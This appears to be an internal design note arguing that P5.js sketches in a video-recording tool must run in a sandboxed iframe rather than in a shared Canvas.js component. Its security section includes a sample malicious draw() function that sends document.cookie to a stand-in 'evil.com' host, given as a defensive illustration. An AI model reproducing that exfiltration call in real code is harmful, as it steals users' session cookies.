# Why P5ToVideo Can't Use Canvas.js - Technical Deep Dive

## The Question
"Why can't we use Canvas.js and hijack the canvas building and have P5.js injected into it?"

---

## Short Answer
**P5.js and Canvas.js are fundamentally incompatible execution models.**

---

## The Problem Breakdown

### 1. P5.js Owns Its Canvas
P5.js is **not a drawing library** - it's an **entire execution environment**.

When you write:
```javascript
function setup() {
  createCanvas(500, 500);
}
```

P5.js:
- Creates the `<canvas>` element itself
- Manages the context internally
- Sets up its own animation loop
- Owns the frame timing
- Controls when draw() is called

**You cannot "inject" P5 into an existing canvas** - P5 must create its own.

### 2. Canvas.js Execution Model

Canvas.js (from ComponentLibrary) expects:
```javascript
new Canvas({
  draw: (ctx, width, height) => {
    ctx.fillRect(0, 0, width, height);  // You control ctx
  }
})
```

You get a `ctx` and draw directly. **You control the drawing.**

### 3. P5.js Execution Model

P5.js expects:
```javascript
function setup() {
  createCanvas(500, 500);  // P5 creates canvas
}

function draw() {
  rect(0, 0, 100, 100);  // P5 wraps ctx calls
}
```

**P5 controls everything** - you never touch `ctx` directly.

---

## Why They Can't Mix

### Attempt 1: Pass P5 Code to Canvas.js draw()

```javascript
new Canvas({
  draw: (ctx, width, height) => {
    // Try to run user's P5 code here?
    eval(userP5Code);  // ❌ Won't work
  }
})
```

**Problems:**
1. `createCanvas()` will try to create ANOTHER canvas (conflict)
2. P5's `rect()`, `ellipse()` etc. aren't available (not in scope)
3. `setup()` and `draw()` functions won't be called by anything
4. No P5 environment (frameCount, mouseX, etc. undefined)

### Attempt 2: Load P5 in Main Page

```javascript
// Load P5.js globally
<script src="p5.js"></script>

new Canvas({
  draw: (ctx, width, height) => {
    // Now P5 functions exist, but...
    rect(0, 0, 100, 100);  // ❌ Still won't work
  }
})
```

**Problems:**
1. P5 functions need P5's internal setup to work
2. `setup()` never gets called
3. `draw()` loop is hijacked by Canvas.js
4. P5's canvas and Canvas.js canvas conflict

### Attempt 3: Create P5 Instance Mode

```javascript
new Canvas({
  draw: (ctx, width, height) => {
    new p5((p) => {
      p.setup = () => { /* user code */ };
      p.draw = () => { /* user code */ };
    });  // ❌ Creates NEW canvas, ignores ours
  }
})
```

**Problems:**
1. P5 instance creates its OWN canvas element
2. Canvas.js canvas is ignored/orphaned
3. Two canvases now exist (conflict)

---

## CCapture.js Requirement

The recording library (CCapture.js) has another constraint:

```javascript
// CCapture needs to:
1. Start when P5 setup() runs
2. Capture each draw() frame
3. Stop after N frames
```

**CCapture MUST be in the same context as P5** to intercept frames.

If P5 runs in main page, CCapture must too.
If P5 runs in iframe, CCapture must too.

**You cannot capture across iframe boundaries.**

---

## The Security Problem

User code like:
```javascript
function draw() {
  // Malicious code
  document.body.innerHTML = '<h1>Hacked!</h1>';
  fetch('evil.com/steal', { 
    method: 'POST', 
    body: document.cookie 
  });
}
```

If this runs in the main page:
- ✅ Can access your page DOM
- ✅ Can steal cookies
- ✅ Can navigate away
- ✅ Can call any API with your origin

If this runs in iframe with sandbox:
- ❌ Cannot access parent page
- ❌ Cannot read parent cookies
- ❌ Isolated execution context
- ✅ Safe

---

## Why Iframe is the ONLY Solution

### Requirements Matrix

| Requirement | Canvas.js | Iframe |
|-------------|-----------|--------|
| P5 creates own canvas | ❌ Conflicts | ✅ Isolated |
| P5 controls draw loop | ❌ Canvas.js owns loop | ✅ P5 owns loop |
| CCapture intercepts frames | ❌ Wrong context | ✅ Same context |
| Security isolation | ❌ Same origin | ✅ Sandboxed |
| User code can't break page | ❌ Full access | ✅ No access |

Only iframe satisfies ALL requirements.

---

## The Architecture

```
Main Page (Trusted)
├── Canvas.js ← For tools that draw directly
└── IframeSandbox
    └── Iframe (Untrusted)
        ├── P5.js (creates canvas)
        ├── CCapture.js (captures frames)
        └── User Code (isolated)
```

**Separation of concerns:**
- Main page: UI, controls, tool logic
- Iframe: User code execution, P5 rendering, frame capture

---

## Alternative That Won't Work

**"What if we parse the P5 code and convert it to Canvas.js calls?"**

Example user code:
```javascript
function draw() {
  for (let i = 0; i < 1000; i++) {
    rotate(0.1);
    rect(i, i, 50, 50);
  }
}
```

To convert this to Canvas.js:
1. Parse JavaScript AST
2. Track P5 state (transformations, styles)
3. Convert P5 API to ctx API
4. Handle `setup()` → `draw()` flow
5. Implement frameCount, mouseX, etc.
6. Support P5 math functions
7. Handle classes, objects, arrays in user code

**Result:** You've rebuilt P5.js. Just use actual P5.js.

---

## Conclusion

Canvas.js and P5.js are **architecturally incompatible**:
- Canvas.js: Direct drawing library
- P5.js: Complete creative coding environment

The iframe approach is not a workaround - it's the **only correct solution** that satisfies:
1. P5.js execution requirements
2. CCapture.js frame capture
3. Security isolation
4. User code safety

This is why the architecture exception was approved.

